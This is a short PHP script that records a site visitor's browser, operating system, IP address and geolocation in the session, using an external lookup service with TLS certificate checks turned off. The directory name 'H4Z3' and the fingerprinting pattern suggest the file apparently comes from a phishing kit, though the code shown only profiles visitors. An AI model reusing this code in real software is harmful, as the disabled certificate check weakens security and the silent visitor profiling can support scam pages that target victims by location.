<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();

require_once __DIR__ . '/../H4Z3/functions.php';

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

$_SESSION['browser'] = getBrowser();
$_SESSION['platform'] = getOs();

$getdetails = "https://extreme-ip-lookup.com/json/".getIp()."";
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['country'] = $country   = $details->country;
$_SESSION['countrycode'] = $countryCode   = $details->countryCode;
$_SESSION['city'] = $city = $details->city;
$_SESSION['ip'] = $query = $details->query;

?>